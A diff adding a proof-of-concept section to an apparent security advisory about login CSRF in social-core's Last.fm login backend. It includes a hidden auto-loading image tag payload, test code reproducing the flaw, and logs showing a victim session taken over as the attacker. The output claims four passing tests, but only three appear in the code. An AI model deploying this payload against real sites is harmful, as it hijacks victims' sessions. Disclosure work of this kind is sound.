@@ -87,6 +87,97 @@ callback is a plain, idempotent `GET` that carries only a `token`, no callback o
 this backend can be distinguished as "the one this browser started." That is the
 definition of login CSRF.
 
+## Proof of concept
+
+### The attack is a single URL
+
+The callback is a plain, idempotent `GET` whose only meaningful parameter is
+`token`, so there is nothing to forge beyond a link:
+
+1. The attacker approves the target application on **their own** Last.fm account
+   and captures where Last.fm redirects them back to:
+
+   ```
+   https://app.example/complete/lastfm/?token=ATK-a60a928997
+   ```
+
+2. The attacker gets the victim's browser to issue that same `GET`. Because it's
+   an idempotent GET, it fires from an ordinary auto-loading tag on any page the
+   victim opens — no click required:
+
+   ```html
+   <!-- the victim only has to load a page containing this -->
+   <img src="https://app.example/complete/lastfm/?token=ATK-a60a928997"
+        style="display:none">
+   ```
+
+The victim's session is now authenticated as the attacker. No token of the
+victim's own was ever involved.
+
+### Library-level proof
+
+Dropped into the backend's own test harness (`BaseBackendTest`, the same base
+the project's `test_lastfm.py` uses). The "victim" session never starts a flow;
+the callback carries only the attacker's approved token:
+
+```python
+class LastFmLoginCSRFTest(BaseBackendTest):
+    backend_path = "social_core.backends.lastfm.LastFmAuth"
+
+    def test_start_binds_nothing_to_the_session(self):
+        start_url = self.backend.start().url
+        self.assertEqual(start_url, "https://www.last.fm/api/auth/?api_key=a-key")
+        # neither a state nor a server-generated token is stored for later verification
+        self.assertIsNone(self.strategy.session_get("lastfm_state"))
+        self.assertIsNone(self.strategy.session_get("lastfm_token"))
+
+    def test_attacker_token_logs_victim_session_in_as_attacker(self):
+        self.mock_get_session()                          # ws.audioscrobbler.com -> {"name": "attacker-lastfm"}
+        self.strategy.set_request_data({"token": "attacker-approved-token"}, self.backend)
+        user = self.backend.complete()
+        self.assertEqual(user.username, "attacker-lastfm")               # session is now the attacker
+        self.assertEqual(self.strategy.session_get("username"), "attacker-lastfm")
+
+    def test_victim_started_own_flow_does_not_change_the_outcome(self):
+        self.backend.start()                             # even a genuine victim-initiated flow...
+        self.mock_get_session()
+        self.strategy.set_request_data({"token": "attacker-approved-token"}, self.backend)
+        self.assertEqual(self.backend.complete().username, "attacker-lastfm")   # ...still loses
+```
+
+All four assertions pass against `5.1.1` / `master`:
+
+```
+test_a_second_arbitrary_token_is_equally_accepted        PASSED
+test_attacker_token_logs_victim_session_in_as_attacker   PASSED
+test_start_binds_nothing_to_the_session                  PASSED
+test_victim_started_own_flow_does_not_change_the_outcome PASSED
+4 passed
+```
+
+### End-to-end (real Django session, real HTTP)
+
+A minimal Django app on the stock `LastFmAuth` backend, run against a mock
+Last.fm speaking HTTPS. The attacker approves on their own account (ARM 1), the
+victim's browser opens the captured URL (ARM 2), and the victim's *server-side*
+session becomes the attacker's (ARM 3–4). The controls confirm a normal own-flow
+login still maps to its own identity, and a tokenless callback is refused:
+
+```
+ARM 0   victim (fresh browser)          -> ANONYMOUS
+ARM 1   attacker approves on OWN acct   -> 302  Location: /complete/lastfm/?token=ATK-a60a928997
+ARM 2   VICTIM opens that URL           -> 302  Location: /
+ARM 3   victim session right after      -> AUTHENTICATED  username=attacker  id=1
+ARM 4   server-side (Django auth_user)  -> _auth_user_id=1 -> username=attacker
+
+CONTROL A   visitor completes OWN flow  -> AUTHENTICATED  username=victim  id=2
+CONTROL B   callback with no token      -> 500  (nothing to exchange)
+
+mock Last.fm side of the exchange:
+  approval issued   token=ATK-a60a928997
+  auth.getSession   token=ATK-a60a928997 -> user=attacker   <-- exchanged inside the VICTIM's session
+```
+
 ## Impact
 
 - **Forced authentication.** Any visitor who can be lured into opening the
